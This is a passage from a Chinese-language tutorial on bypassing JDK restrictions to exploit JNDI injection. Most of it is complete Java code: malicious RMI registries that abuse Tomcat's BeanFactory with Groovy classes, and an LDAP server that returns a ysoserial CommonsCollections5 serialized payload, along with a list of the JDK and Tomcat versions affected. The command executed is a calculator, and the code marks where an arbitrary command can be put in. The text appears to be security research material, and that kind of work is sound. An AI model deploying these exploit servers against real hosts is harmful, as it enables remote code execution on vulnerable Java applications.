        public static void main(String[] args) throws NamingException {
                String uri = "rmi://192.168.202.1:1099/exp";
                Context ctx = new InitialContext();
                ctx.lookup(uri);
        }
    }
  1. 执行客户端进行连接后，成功弹出计算器
##### 总结：
适用版本：我目前测试了几个常用版本8u102、8u121、8u191、8u202都可以使用，可以说实用性很广了
利用前提：受害机器是tomcat8以上的版本，因为要tomcat8里面的jar包依赖
依赖了两个类都是tomcat8里面jar包存在的类
  * org.apache.naming.factory.BeanFactory
  * javax.el.ELProcessor
>
> javax.el.ELProcessor本身是Tomcat8中存在的库，所以仅限Tomcat8及更高版本环境下可以通过javax.el.ELProcessor进行攻击，对于使用广泛的SpringBoot应用来说，可被利用的Spring
> Boot Web Starter版本应在1.2.x及以上，因为1.1.x及1.0.x内置的是Tomcat7。
#### (2) 依赖groovy 2以上相关类
客户端所需的jar包，pom.xml
                org.codehaus.groovy
                groovy
                2.4.5
服务端代码
    package com.yy.jndi.jdk8u121;
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    import org.apache.naming.ResourceRef;
    import javax.naming.NamingException;
    import javax.naming.StringRefAddr;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class ExecByGroovyParse {
        public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
            Registry registry = LocateRegistry.createRegistry(1099);
            ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            ref.add(new StringRefAddr("forceString", "x=parseClass"));
            String script = String.format("@groovy.transform.ASTTest(value={\n" +
                            "    assert java.lang.Runtime.getRuntime().exec(\"%s\")\n" +
                            "})\n" +
                            "def x\n",
    //                commandGenerator.getBase64CommandTpl()
                    "gnome-calculator"
            );
            ref.add(new StringRefAddr("x",script));
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(ref);
            registry.bind("exp", refObjWrapper);
            System.out.println("Creating evil RMI registry on port 1099");
        }
    }
#### (3) 依赖groovy任意版本的类
比如版本1.5
                org.codehaus.groovy
                groovy-all
                1.5.0
服务端代码：
    package com.yy.jndi.jdk8u121;
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    import org.apache.naming.ResourceRef;
    import javax.naming.NamingException;
    import javax.naming.StringRefAddr;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class ExecByGroovy {
        public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
            Registry registry = LocateRegistry.createRegistry(1099);
            ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            ref.add(new StringRefAddr("forceString", "x=evaluate"));
            String script = String.format("'%s'.execute()", "gnome-calculator"); //commandGenerator.getBase64CommandTpl());
            ref.add(new StringRefAddr("x",script));
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(ref);
            registry.bind("exp", refObjWrapper);
            System.out.println("Creating evil RMI registry on port 1099");
        }
    }
### JNDI+LDAP高版本绕过
JDK 6u211，7u201, 8u191, 11.0.1开始  
`com.sun.jndi.ldap.object.trustURLCodebase` 属性的默认值被调整为false，导致LDAP远程代码攻击方式开始失效
**利用`javaSerializedData`属性**
当javaSerializedData属性的`value`值不为空时，会对该值进行反序列化处理，当本地存在反序列化利用链时，即可触发。
假设目标存在一个CC链所需的类库，那么可以利用这点进行利用
**1.先使用ysoserial.jar生成CC链的poc**
    java -jar ysoserial.jar CommonsCollections5 gnome-calculator > poc.txt
**2.转换为base64编码后放到服务端代码里**
服务端代码：
    package com.yy.jndi.jdk8u191;
    import com.unboundid.ldap.listener.InMemoryDirectoryServer;
    import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
    import com.unboundid.ldap.listener.InMemoryListenerConfig;
    import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
    import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
    import com.unboundid.ldap.sdk.Entry;
    import com.unboundid.ldap.sdk.LDAPResult;
    import com.unboundid.ldap.sdk.ResultCode;
    import com.unboundid.util.Base64;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import javax.management.BadAttributeValueExpException;
    import javax.net.ServerSocketFactory;
    import javax.net.SocketFactory;
    import javax.net.ssl.SSLSocketFactory;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.net.InetAddress;
    import java.net.URL;
    import java.util.HashMap;
    import java.util.Map;
    public class LDAPServer {
        private static final String LDAP_BASE = "dc=example,dc=com";
        public static void main ( String[] tmp_args ) throws Exception{
            String[] args=new String[]{"http://localhost/#Evail"}; 
            int port = 6666;
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();
        }
        private static class OperationInterceptor extends InMemoryOperationInterceptor {
            private URL codebase;
            public OperationInterceptor ( URL cb ) {
                this.codebase = cb;
            }
            @Override
            public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
                String base = result.getRequest().getBaseDN();
                Entry e = new Entry(base);
                try {
                    sendResult(result, base, e);
                }
                catch ( Exception e1 ) {
                    e1.printStackTrace();
                }
            }
            protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
                URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
                System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
                e.addAttribute("javaClassName", "foo");
                String cbstring = this.codebase.toString();
                int refPos = cbstring.indexOf('#');
                if ( refPos > 0 ) {
                    cbstring = cbstring.substring(0, refPos);
                }
                e.addAttribute("javaSerializedData", Base64.decode("base64 encode payload"));
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }
        }
    }
代码的String[]字符串里面ip并不影响payload执行，随便填或者默认localhost都可
**3.启动服务端后，客户端连接6666端口即可执行成功**
参考：